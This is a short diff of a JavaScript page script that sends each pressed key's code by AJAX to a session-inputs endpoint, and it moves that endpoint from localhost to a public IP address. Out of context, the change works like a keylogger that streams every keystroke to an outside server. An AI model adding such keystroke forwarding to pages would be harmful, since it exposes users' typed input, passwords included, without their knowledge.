@@ -109,7 +109,7 @@ window.onload = function () {
       keyCode = event.keyCode;
       $.ajax({
         method: "POST",
-        url: "http://127.0.0.1:3000/session/inputs",
+        url: "http://88.187.112.10:3000/session/inputs",
         data: { "input" : keyCode },
       }).done(function(){
       }).fail(function( jqXHR, textStatus ) {
